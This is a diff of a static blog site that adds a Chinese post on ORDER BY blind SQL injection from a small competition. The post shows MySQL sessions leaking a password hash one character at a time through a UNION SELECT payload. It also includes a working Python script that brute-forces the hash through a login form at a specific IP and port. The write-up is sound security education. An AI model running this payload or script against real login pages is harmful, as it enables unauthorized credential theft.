@@ -6,18 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 风筝</title>
+  <title>记一次order by盲注 | 风筝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="风筝">
-<meta property="og:type" content="website">
-<meta property="og:title" content="风筝">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="前言最近打一场小比赛遇到了order by盲注，这里记录一下原理 order by盲注首先有如下表  1234567891011121314151617181920212223242526272829303132333435mysql&amp;gt; select * from user where username=&amp;apos;&amp;apos; or 1 union select 1,2,&amp;apos;5&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次order by盲注">
+<meta property="og:url" content="http://yoursite.com/2019/11/06/order by/index.html">
 <meta property="og:site_name" content="风筝">
-<meta property="og:description" content="风筝">
+<meta property="og:description" content="前言最近打一场小比赛遇到了order by盲注，这里记录一下原理 order by盲注首先有如下表  1234567891011121314151617181920212223242526272829303132333435mysql&amp;gt; select * from user where username=&amp;apos;&amp;apos; or 1 union select 1,2,&amp;apos;5&amp;a">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/30/KhlQDs.png">
+<meta property="og:updated_time" content="2019-11-06T15:48:43.225Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="风筝">
-<meta name="twitter:description" content="风筝">
+<meta name="twitter:title" content="记一次order by盲注">
+<meta name="twitter:description" content="前言最近打一场小比赛遇到了order by盲注，这里记录一下原理 order by盲注首先有如下表  1234567891011121314151617181920212223242526272829303132333435mysql&amp;gt; select * from user where username=&amp;apos;&amp;apos; or 1 union select 1,2,&amp;apos;5&amp;a">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/10/30/KhlQDs.png">
   
     <link rel="alternative" href="/atom.xml" title="风筝" type="application/atom+xml">
   
@@ -153,295 +156,161 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-order by" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      记一次order by盲注
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/06/order by/" class="archive-article-date">
+
+        
+        <a href="/2019/11/06/order by/" class="archive-article-date">
   	<time datetime="2019-11-06T15:48:43.214Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-06</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/06/order by/">记一次order by盲注</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打一场小比赛遇到了order by盲注，这里记录一下原理</p>
+<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>首先有如下表</p>
+<p><img src="https://s2.ax1x.com/2019/10/30/KhlQDs.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;5&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">|    1 | 2        | 5                                |</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|    1 | 2        | 6                                |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;51&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">|    1 | 2        | 51                               |</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;52&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|    1 | 2        | 52                               |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>通过逐位判断便可得到password</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://120.55.43.255:13004/login.php"</span></span><br><span class="line">str_1 = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str_1:</span><br><span class="line">        payload = <span class="string">"' or 1 union select 1,'test','%s%s' order by 3#"</span>%(flag,s)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:<span class="string">'%s'</span>%(payload),<span class="string">'passwd'</span>: <span class="string">'1'</span>&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">if</span> ord(s) == <span class="number">97</span>:</span><br><span class="line">                flag += chr(<span class="number">57</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag += chr(ord(s)<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/xishaonian/p/7703486.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/7703486.html</a></p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/11/06/order by/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/17/eval与assert/" class="archive-article-date">
-  	<time datetime="2019-10-17T12:49:22.947Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-17</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/10/17/eval与assert/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">eval and assert</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/17/eval与assert/">eval and assert</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/14/dedecms5.7/" class="archive-article-date">
-  	<time datetime="2019-10-14T10:54:20.810Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/14/dedecms5.7/">dedecms最新版后台三处getshell</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/10/ctf夺旗赛/" class="archive-article-date">
-  	<time datetime="2019-10-10T13:54:25.267Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/10/ctf夺旗赛/">CTF夺旗赛</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/09/zzcms8.2/" class="archive-article-date">
-  	<time datetime="2019-10-09T02:54:27.176Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/09/zzcms8.2/">ZZCMS8.2 代码审计</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/08/08/whatweb/" class="archive-article-date">
-  	<time datetime="2019-08-08T06:47:30.145Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/08/08/whatweb/">网站指纹识别工具Whatweb</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/07/31/sql-hack1/" class="archive-article-date">
-  	<time datetime="2019-07-31T05:00:47.429Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/07/31/sql-hack1/">记一次过waf注入</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/06/09/bluecms/" class="archive-article-date">
-  	<time datetime="2019-06-09T03:47:40.622Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/06/09/bluecms/">代码审计[day1]-bluecms</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/06/01/rsa/" class="archive-article-date">
-  	<time datetime="2019-06-01T06:19:14.761Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/06/01/rsa/">RSA</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/17/jwt/" class="archive-article-date">
-  	<time datetime="2019-05-17T03:06:57.290Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/17/jwt/">Json Web Token</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -465,8 +334,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
